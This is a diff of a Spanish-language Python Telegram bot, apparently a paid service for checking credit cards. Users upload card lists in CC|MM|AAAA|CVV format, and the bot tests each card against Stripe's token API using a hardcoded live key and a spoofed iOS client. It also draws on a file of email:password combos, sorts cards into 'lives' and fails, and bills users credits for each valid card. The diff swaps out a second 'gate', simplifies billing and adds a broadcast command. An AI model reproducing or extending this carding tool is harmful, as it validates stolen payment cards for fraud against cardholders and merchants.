@@ -15,9 +15,6 @@ import requests
 from telebot import apihelper, TeleBot
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 
-# Importar el nuevo gate de Telcel
-from telcel_gate import procesar_tarjeta_telcel
-
 # Activar reintentos automáticos en fallas de red de Telegram
 apihelper.RETRY_ON_ERROR = True
 
@@ -51,8 +48,7 @@ estado = {
     "lista_fallos": [],
     "usuario_actual": "Anónimo",
     "chat_id_actual": None,
-    "user_id_actual": None,
-    "gate_actual": "stripe"
+    "user_id_actual": None
 }
 estado_lock = threading.Lock()
 cola_tareas = queue.Queue()
@@ -71,18 +67,20 @@ DATA_DIR = os.path.join(BASE_DIR, "data") if os.path.exists(os.path.join(BASE_DI
 os.makedirs(DATA_DIR, exist_ok=True)
 
 ARCHIVO_CLIENTES = os.path.join(DATA_DIR, "clientes.txt")
+
+# 👇 CORREGIDO: Ahora se guardan dentro de la carpeta /data del volumen persistente
 LIVES_FILE = os.path.join(DATA_DIR, "lives.txt")
 FAIL_FILE = os.path.join(DATA_DIR, "fail.txt")
 
 creditos_lock = threading.Lock()
 
-COSTO_SUCCESS_STRIPE = 4
-COSTO_SUCCESS_TELCEL = 10
+COSTO_SUCCESS = 4
 COSTO_FAIL = 0
 CREDITOS_INICIALES = 40  # 🎁 Créditos gratis para nuevos usuarios
 
 
 def notificar_propietario(mensaje):
+    """Envía un mensaje de log/reporte al propietario."""
     try:
         bot.send_message(PROPIETARIO_ID, mensaje, parse_mode="HTML")
     except Exception as e:
@@ -124,6 +122,7 @@ def obtener_saldo(user_id):
 
 
 def registrar_usuario(user_id, username):
+    """Registra al usuario y le otorga 40 créditos gratis si es su primera vez."""
     with creditos_lock:
         clientes = cargar_clientes()
         user_str = str(user_id)
@@ -148,6 +147,7 @@ def registrar_usuario(user_id, username):
 
 
 def modificar_creditos_por_identificador(identificador, cantidad):
+    """Permite sumar o restar créditos buscando por ID o Username."""
     with creditos_lock:
         clientes = cargar_clientes()
         id_buscado = str(identificador).strip().lstrip("@")
@@ -173,8 +173,8 @@ def modificar_creditos_por_identificador(identificador, cantidad):
         return True, (user_key, clientes[user_key]["username"], nuevo_saldo)
 
 
-def cobrar_creditos_por_resultado(user_id, es_exito, gate_tipo):
-    costo = (COSTO_SUCCESS_TELCEL if gate_tipo == "telcel" else COSTO_SUCCESS_STRIPE) if es_exito else COSTO_FAIL
+def cobrar_creditos_por_resultado(user_id, es_exito):
+    costo = COSTO_SUCCESS if es_exito else COSTO_FAIL
     if costo == 0:
         return obtener_saldo(user_id) or 0, 0
 
@@ -189,6 +189,8 @@ def cobrar_creditos_por_resultado(user_id, es_exito, gate_tipo):
             guardar_clientes(clientes)
             return nuevo_saldo, costo
         return 0, costo
+
+
 
 
 def validar_tarjeta(cc, mes, anio, cvv):
@@ -233,16 +235,14 @@ def notificar_usuarios_en_espera():
 
 def obtener_menu_principal():
     markup = InlineKeyboardMarkup()
-    btn_check_stripe = InlineKeyboardButton("⚡ STRIPE (4 Cr.)", callback_data="btn_check_stripe")
-    btn_check_telcel = InlineKeyboardButton("📱 TELCEL (10 Cr.)", callback_data="btn_check_telcel")
+    btn_check = InlineKeyboardButton("⚡ CHECK_CCS (API STRIPE)", callback_data="btn_check_ccs")
     btn_saldo = InlineKeyboardButton("💰 Mis Créditos", callback_data="btn_saldo")
     btn_instrucciones = InlineKeyboardButton("📖 Instrucciones", callback_data="btn_instrucciones")
     btn_formato = InlineKeyboardButton("📌 Formato Correcto", url="https://t.me/filtro_carbon_bot")
     btn_comprar = InlineKeyboardButton("🛒 Comprar", url="https://t.me/Juanper33z")
     btn_grupo = InlineKeyboardButton("📢 Mi Grupo", url="https://t.me/+kIN_CgyaWP5lZDUx")
 
-    markup.row(btn_check_stripe, btn_check_telcel)
-    markup.row(btn_saldo)
+    markup.row(btn_check, btn_saldo)
     markup.row(btn_instrucciones, btn_formato)
     markup.row(btn_comprar, btn_grupo)
     return markup
@@ -266,7 +266,7 @@ def generar_resumen_proceso(user_id=None):
 def generar_informe_propietario():
     saldo_usuario = obtener_saldo(estado["user_id_actual"]) if estado["user_id_actual"] else "N/A"
     
-    informe = f"🏁 <b>REPORTES Y RESULTADOS DE LOTE ({estado['gate_actual'].upper()})</b>\n"
+    informe = f"🏁 <b>REPORTES Y RESULTADOS DE LOTE</b>\n"
     informe += f"👤 <b>Usuario:</b> @{estado['usuario_actual']} (<code>{estado['user_id_actual']}</code>)\n"
     informe += f"💰 <b>Saldo restante:</b> {saldo_usuario} cr.\n"
     informe += f"📊 <b>Totales:</b> {estado['procesados']}/{estado['total']} (✅ {estado['exitosos']} | ❌ {estado['fallidos']})\n\n"
@@ -282,23 +282,24 @@ def generar_informe_propietario():
     if estado["lista_fallos"]:
         for item in estado["lista_fallos"][:25]:
             informe += f"• <code>{item['cc']}</code> | {item['msg']}\n"
+        if len(estado["lista_fallos"]) > 25:
+            informe += f"<i>...y {len(estado['lista_fallos']) - 25} fallos más.</i>\n"
     else:
         informe += "<i>Sin fallos registrados.</i>\n"
 
     return informe
 
 
-def solicitar_datos_ccs(chat_id, user_id, gate_tipo):
+def solicitar_datos_ccs(chat_id, user_id):
     saldo = obtener_saldo(user_id)
     if saldo is None:
         bot.send_message(chat_id, "❌ No estás registrado. Escribe /start primero.")
         return
 
-    costo_requerido = COSTO_SUCCESS_TELCEL if gate_tipo == "telcel" else COSTO_SUCCESS_STRIPE
-    if saldo < costo_requerido:
+    if saldo < COSTO_SUCCESS:
         bot.send_message(
             chat_id,
-            f"⛔ <b>Saldo insuficiente para iniciar:</b> Tienes <b>{saldo} créditos</b> y necesitas al menos <b>{costo_requerido} créditos</b> para procesar en este gate.",
+            f"⛔ <b>Saldo insuficiente para iniciar:</b> Tienes <b>{saldo} créditos</b> y necesitas al menos <b>{COSTO_SUCCESS} créditos</b> para procesar.",
             parse_mode="HTML",
         )
         return
@@ -314,16 +315,16 @@ def solicitar_datos_ccs(chat_id, user_id, gate_tipo):
             )
             return
 
-    gate_nombre = "Telcel Gate (Recarga)" if gate_tipo == "telcel" else "Stripe API Gate"
     msg = bot.send_message(
         chat_id,
-        f"📋 <b>Gate Activo: {gate_nombre}</b>\n"
+        f"📋 <b>Gate Stripe API Active</b>\n"
         f"💳 <b>Saldo disponible: {saldo} créditos</b>\n"
-        f"<i>(Costo: {costo_requerido} créditos por SUCCESS | Fails gratis)</i>\n\n"
-        "Envía tus tarjetas en formato <code>CC|MM|AAAA|CVV</code> o sube un archivo <code>.txt</code>:",
+        f"<i>(Costo: {COSTO_SUCCESS} créditos por SUCCESS | Fails totalmente GRATIS)</i>\n\n"
+        "Envía tus tarjetas en formato <code>CC|MM|AAAA|CVV</code> o sube un archivo <code>.txt</code>:\n"
+        "<i>(Si tu lista está desordenada, puedes formatearla con @filtro_carbon_bot)</i>",
         parse_mode="HTML",
     )
-    bot.register_next_step_handler(msg, lambda m: recibir_datos_lote(m, gate_tipo))
+    bot.register_next_step_handler(msg, recibir_datos_lote)
 
 
 def procesar_tarjeta_api(correo, password, linea_cc):
@@ -332,7 +333,7 @@ def procesar_tarjeta_api(correo, password, linea_cc):
         cc = cc_partes[0]
         mm = cc_partes[1]
         yyyy = cc_partes[2]
-        cvv = cc_partes[3]
+        ccv = cc_partes[3]
     except IndexError:
         return False, "Formato incorrecto en la línea de tarjeta"
 
@@ -346,6 +347,7 @@ def procesar_tarjeta_api(correo, password, linea_cc):
     )
 
     session = requests.Session()
+
     stripe_url = "https://api.stripe.com/v1/tokens"
     stripe_headers = {
         "Host": "api.stripe.com",
@@ -359,7 +361,7 @@ def procesar_tarjeta_api(correo, password, linea_cc):
         "X-Stripe-User-Agent": '{"type":"iPad11,6","os_version":"18.4","bindings_version":"24.14.0","vendor_identifier":"3B576E16-E88C-4CBC-A3A0-E0490F33025C","lang":"objective-c","model":"iPad"}',
         "Authorization": "Bearer pk_live_51OjVj8FXiwuOsp7TTDvOZMPwEf81Jf8vmLt0pj9Mip3RcjHQIMyV4FIV9UKdIKY9WBY0GiFd1Oo2NY4Dpd0L3VrR00XBj375RZ",
     }
-    stripe_payload = f"card[cvc]={cvv}&card[exp_month]={mm}&card[exp_year]={yyyy}&card[name]=Juan%20Perez&card[number]={cc}&payment_user_agent=stripe-ios/24.14.0%3B%20variant.payments-ui%3B%20STPPaymentCardTextField"
+    stripe_payload = f"card[cvc]={ccv}&card[exp_month]={mm}&card[exp_year]={yyyy}&card[name]=Juan%20Perez&card[number]={cc}&payment_user_agent=stripe-ios/24.14.0%3B%20variant.payments-ui%3B%20STPPaymentCardTextField"
 
     try:
         resp_stripe = session.post(stripe_url, headers=stripe_headers, data=stripe_payload, timeout=15)
@@ -459,43 +461,34 @@ def worker_principal():
             linea_cc = tarea.get("linea_cc")
             correo = tarea.get("correo")
             password = tarea.get("password")
-            gate_tipo = tarea.get("gate_tipo", "stripe")
 
-            costo_requerido = COSTO_SUCCESS_TELCEL if gate_tipo == "telcel" else COSTO_SUCCESS_STRIPE
             if user_id:
                 saldo_actual = obtener_saldo(user_id)
-                if saldo_actual is None or saldo_actual < costo_requerido:
+                if saldo_actual is None or saldo_actual < COSTO_SUCCESS:
                     with estado_lock:
                         estado["en_progreso"] = False
                     bot.send_message(
                         chat_id, 
-                        f"⛔ <b>Proceso detenido:</b> Tu saldo actual es de <b>{saldo_actual} créditos</b> y necesitas al menos <b>{costo_requerido} créditos</b> para continuar.", 
+                        f"⛔ <b>Proceso detenido:</b> Tu saldo actual es de <b>{saldo_actual} créditos</b> y necesitas al menos <b>{COSTO_SUCCESS} créditos</b> para continuar procesando.", 
                         parse_mode="HTML"
                     )
                     break
 
-            # Ejecutar el gate correspondiente
-            if gate_tipo == "telcel":
-                exito, mensaje_resultado = procesar_tarjeta_telcel(correo, password, linea_cc)
-            else:
-                exito, mensaje_resultado = procesar_tarjeta_api(correo, password, linea_cc)
+            exito, mensaje_resultado = procesar_tarjeta_api(correo, password, linea_cc)
 
             if user_id:
-                cobrar_creditos_por_resultado(user_id, exito, gate_tipo)
+                cobrar_creditos_por_resultado(user_id, exito)
 
             with estado_lock:
                 estado["procesados"] += 1
                 if exito:
                     estado["exitosos"] += 1
                     estado["lista_exitos"].append({"cc": linea_cc, "msg": mensaje_resultado})
-                    with open(LIVES_FILE, "a", encoding="utf-8") as f:
-                        f.write(f"{linea_cc} | {mensaje_resultado}\n")
                 else:
                     estado["fallidos"] += 1
                     estado["lista_fallos"].append({"cc": linea_cc, "msg": mensaje_resultado})
-                    with open(FAIL_FILE, "a", encoding="utf-8") as f:
-                        f.write(f"{linea_cc} | {mensaje_resultado}\n")
 
+            # Notificación en tiempo real para el cliente (tanto Success como Fail)
             notificar_resultado_telegram(chat_id, exito, linea_cc, mensaje_resultado)
 
             with estado_lock:
@@ -523,14 +516,14 @@ def notificar_resultado_telegram(chat_id, exito, linea_cc, mensaje_detectado):
     if not chat_id:
         return
     status_texto = "SUCCESS✅" if exito else "FAIL❌"
-    mensaje = f"STATUS: {status_texto}\n💳 <code>{linea_cc}</code>\n💬 <b>Mensaje:</b> <i>{str(mensaje_detectado)[:100]}</i>"
+    mensaje = f"STATUS: {status_texto}\n💳 <code>{linea_cc}</code>\n💬 <b>Mensaje:</b> <i>{mensaje_detectado[:100]}</i>"
     try:
         bot.send_message(chat_id, mensaje, parse_mode="HTML")
     except Exception:
         pass
 
 
-def recibir_datos_lote(message, gate_tipo):
+def recibir_datos_lote(message):
     chat_id = message.chat.id
     user_id = message.from_user.id
     username = message.from_user.username or "Anonimo"
@@ -591,16 +584,17 @@ def recibir_datos_lote(message, gate_tipo):
 
     combos_path = os.path.join(BASE_DIR, "COMBO.txt")
     if not os.path.exists(combos_path):
-        bot.send_message(chat_id, "❌ No se encontró el archivo `COMBO.txt` en el servidor.")
+        bot.send_message(chat_id, "❌ No se encontró el archivo `combo.txt` en el servidor.")
         return
     
     with open(combos_path, "r", encoding="utf-8") as f:
         combos = [l.strip() for l in f if ":" in l and l.strip()]
 
     if not combos:
-        bot.send_message(chat_id, "❌ El archivo `COMBO.txt` está vacío.")
+        bot.send_message(chat_id, "❌ El archivo `combo.txt` está vacío.")
         return
 
+    # 👇 LIMPIAR LA COLA DE TAREAS ANTES DE INSERTAR NUEVAS (Evita que se repitan procesos viejos)
     while not cola_tareas.empty():
         try:
             cola_tareas.get_nowait()
@@ -620,7 +614,6 @@ def recibir_datos_lote(message, gate_tipo):
         estado["usuario_actual"] = username
         estado["chat_id_actual"] = chat_id
         estado["user_id_actual"] = user_id
-        estado["gate_actual"] = gate_tipo
 
     global contador_expiradas
     contador_expiradas += len([r for r in tarjetas_rechazadas if r[1] == "EXPIRADA"])
@@ -637,18 +630,17 @@ def recibir_datos_lote(message, gate_tipo):
             "correo": correo.strip(),
             "password": password.strip(),
             "chat_id": chat_id,
-            "user_id": user_id,
-            "gate_tipo": gate_tipo
+            "user_id": user_id
         })
 
     bot.send_message(
         chat_id,
-        f"🚀 <b>Lote aceptado:</b> {len(tarjetas_validas)} tarjetas en cola ({gate_tipo.upper()} Gate).",
+        f"🚀 <b>Lote aceptado:</b> {len(tarjetas_validas)} tarjetas en cola (Stripe Gate API).",
         parse_mode="HTML"
     )
 
     notificar_propietario(
-        f"🚀 <b>NUEVO CHEQUEO INICIADO ({gate_tipo.upper()})</b>\n"
+        f"🚀 <b>NUEVO CHEQUEO INICIADO</b>\n"
         f"• <b>Usuario:</b> @{username} (<code>{user_id}</code>)\n"
         f"• <b>Total de CCs:</b> {len(tarjetas_validas)}"
     )
@@ -663,12 +655,13 @@ def cmd_start(message):
     msg = f"👋 ¡Hola {message.from_user.first_name}!\n\n"
     if creado:
         msg += f"🎉 <b>¡Bienvenido! Se te han otorgado {CREDITOS_INICIALES} créditos gratis</b> por registrarte.\n\n"
-    msg += f"💰 *Tus créditos actuales:* {saldo}\n\nUsa el menú para seleccionar el Gate."
+    msg += f"💰 *Tus créditos actuales:* {saldo}\n\nUsa el menú para navegar."
     bot.send_message(message.chat.id, msg, parse_mode="HTML", reply_markup=obtener_menu_principal())
 
 
 @bot.message_handler(commands=["id", "me", "perfil"])
 def cmd_mi_perfil(message):
+    """Muestra al cliente su ID, su Username y sus créditos actuales."""
     uid = message.from_user.id
     uname = message.from_user.username or "Sin usuario"
     registrar_usuario(uid, message.from_user.username)
@@ -697,8 +690,9 @@ def cmd_gestion_creditos(message):
             message.chat.id,
             "⚠️ <b>Uso incorrecto del comando.</b>\n\n"
             "Formatos válidos:\n"
-            "• <code>/creditos ID_o_Username +20</code>\n"
-            "• <code>/creditos ID_o_Username -10</code>",
+            "• <code>/creditos ID_o_Username +20</code> (para sumar)\n"
+            "• <code>/creditos ID_o_Username -10</code> (para restar)\n"
+            "• <code>/creditos ID_o_Username 50</code> (establece/suma directa)",
             parse_mode="HTML"
         )
         return
@@ -714,7 +708,7 @@ def cmd_gestion_creditos(message):
         else:
             cantidad = int(param_cant)
     except ValueError:
-        bot.send_message(message.chat.id, "❌ Cantidad inválida.", parse_mode="HTML")
+        bot.send_message(message.chat.id, "❌ Cantidad inválida. Debe ser un número entero (ej: <code>+20</code> o <code>-10</code>).", parse_mode="HTML")
         return
 
     exito, resultado = modificar_creditos_por_identificador(identificador, cantidad)
@@ -727,10 +721,79 @@ def cmd_gestion_creditos(message):
 
     bot.send_message(
         message.chat.id,
-        f"✅ <b>CRÉDITOS ACTUALIZADOS</b>\n\n"
+        f"✅ <b>CRÉDITOS ACTUALIZADOS CON ÉXITO</b>\n\n"
         f"• <b>Usuario:</b> @{uname_afectado}\n"
-        f"• <b>Modificación:</b> <code>{signo_str}</code>\n"
-        f"• <b>Nuevo saldo total:</b> <b>{nuevo_saldo}</b>",
+        f"• <b>ID:</b> <code>{uid_afectado}</code>\n"
+        f"• <b>Modificación:</b> <code>{signo_str}</code> créditos\n"
+        f"• <b>Nuevo saldo total:</b> <b>{nuevo_saldo}</b> créditos",
+        parse_mode="HTML"
+    )
+
+    try:
+        bot.send_message(
+            int(uid_afectado),
+            f"🔔 <b>¡El administrador ha actualizado tus créditos!</b>\n\n"
+            f"• <b>Cambio:</b> <code>{signo_str}</code> créditos\n"
+            f"• <b>Tu nuevo saldo:</b> <b>{nuevo_saldo}</b> créditos",
+            parse_mode="HTML"
+        )
+    except Exception:
+        pass
+
+
+@bot.message_handler(commands=["anuncio", "broadcast"])
+def cmd_anuncio(message):
+    if message.from_user.id != PROPIETARIO_ID:
+        bot.send_message(message.chat.id, "⛔ Comando exclusivo del propietario.")
+        return
+
+    texto_anuncio = ""
+    if message.reply_to_message:
+        texto_anuncio = message.reply_to_message.text or message.reply_to_message.caption
+    else:
+        partes = message.text.split(maxsplit=1)
+        if len(partes) > 1:
+            texto_anuncio = partes[1]
+
+    if not texto_anuncio:
+        bot.send_message(
+            message.chat.id,
+            "⚠️ <b>Uso correcto:</b>\n"
+            "• <code>/anuncio Tu mensaje aquí</code>\n"
+            "• O responde a un mensaje con <code>/anuncio</code>",
+            parse_mode="HTML"
+        )
+        return
+
+    clientes = cargar_clientes()
+    if not clientes:
+        bot.send_message(message.chat.id, "❌ No hay usuarios registrados.", parse_mode="HTML")
+        return
+
+    enviados = 0
+    fallidos = 0
+    
+    msg_estado = bot.send_message(message.chat.id, "📢 <b>Enviando anuncio masivo...</b>", parse_mode="HTML")
+
+    for uid in list(clientes.keys()):
+        try:
+            bot.send_message(
+                int(uid),
+                f"📢 <b>ANUNCIO DEL ADMINISTRADOR</b>\n\n{texto_anuncio}",
+                parse_mode="HTML"
+            )
+            enviados += 1
+            time.sleep(0.05)
+        except Exception:
+            fallidos += 1
+
+    bot.edit_message_text(
+        f"✅ <b>ANUNCIO ENVIADO CON ÉXITO</b>\n\n"
+        f"• <b>Entregados:</b> {enviados}\n"
+        f"• <b>Fallidos:</b> {fallidos}\n"
+        f"• <b>Total en BD:</b> {len(clientes)}",
+        chat_id=message.chat.id,
+        message_id=msg_estado.message_id,
         parse_mode="HTML"
     )
 
@@ -754,9 +817,10 @@ def cmd_stop_proceso(message):
         except queue.Empty:
             break
 
-    bot.send_message(chat_id, "🛑 <b>El proceso ha sido detenido.</b>", parse_mode="HTML")
+    bot.send_message(chat_id, "🛑 <b>El proceso ha sido detenido por el usuario.</b>", parse_mode="HTML")
     resumen_texto = generar_resumen_proceso(user_id)
     bot.send_message(chat_id, resumen_texto, parse_mode="HTML")
+    
     notificar_propietario(f"🛑 <b>Proceso detenido manualmente</b> por @{message.from_user.username or 'Anonimo'}")
     notificar_usuarios_en_espera()
 
@@ -771,20 +835,27 @@ def callback_listener(call):
     except Exception:
         pass
 
-    if call.data == "btn_check_stripe":
-        solicitar_datos_ccs(chat_id, user_id, "stripe")
-    elif call.data == "btn_check_telcel":
-        solicitar_datos_ccs(chat_id, user_id, "telcel")
+    if call.data == "btn_check_ccs":
+        solicitar_data = solicitar_datos_ccs(chat_id, user_id)
     elif call.data == "btn_saldo":
         saldo = obtener_saldo(user_id)
         bot.send_message(chat_id, f"💰 Tienes <b>{saldo}</b> créditos disponibles.", parse_mode="HTML")
     elif call.data == "btn_instrucciones":
         inst = (
             "📖 <b>GUÍA Y SISTEMA DE CRÉDITOS</b>\n\n"
-            "⚡ <b>Stripe API Gate:</b> Costo de <b>4 créditos</b> por SUCCESS.\n"
-            "📱 <b>Telcel Gate:</b> Costo de <b>10 créditos</b> por SUCCESS.\n"
-            "❌ <b>Fails:</b> Totalmente GRATIS en ambos gates.\n\n"
-            "📌 <b>FORMATO:</b> <code>CC|MM|AAAA|CVV</code>"
+            "💳 <b>Gate Activo:</b> Stripe API\n"
+            "⚡ <b>Velocidad:</b> Ultra rápida por Peticiones HTTP.\n\n"
+            "📌 <b>FORMATO ACEPTADO:</b>\n"
+            "Puedes enviar una tarjeta o un archivo <code>.txt</code> en formato:\n"
+            "<code>CC|MM|AAAA|CVV</code>\n\n"
+            "💡 <i>Si tus datos no están limpios, usa el botón '📌 Formato Correcto' o entra a @filtro_carbon_bot para ordenarlos automáticamente.</i>\n\n"
+            "💰 <b>REGLAS DE COBRO DE CRÉDITOS:</b>\n"
+            "• 🎁 <b>Bono de Bienvenida:</b> 40 créditos gratis al registrarte.\n"
+            "• ✅ <b>Éxito (SUCCESS):</b> Se cobran <b>4 créditos</b> por cada tarjeta aprobada.\n"
+            "• ❌ <b>Fallo (FAIL):</b> Totalmente <b>GRATIS</b> (0 créditos descontados).\n"
+            "• ⏳ <b>Expiradas / Formato Inválido:</b> Se descartan automáticamente antes de procesar sin costo.\n\n"
+            "🔍 <b>COMANDOS DISPONIBLES:</b>\n"
+            "• /id (o /me) ➔ Muestra tu ID, usuario y créditos."
         )
         bot.send_message(chat_id, inst, parse_mode="HTML")
     elif call.data == "btn_avisar":
@@ -795,5 +866,5 @@ def callback_listener(call):
 
 if __name__ == "__main__":
     threading.Thread(target=worker_principal, daemon=True, name="Worker-HTTP").start()
-    print("🤖 Bot de Telegram multigate en marcha...")
+    print("🤖 Bot de Telegram (Railway Ready) en marcha...")
     bot.infinity_polling(timeout=20, long_polling_timeout=10)
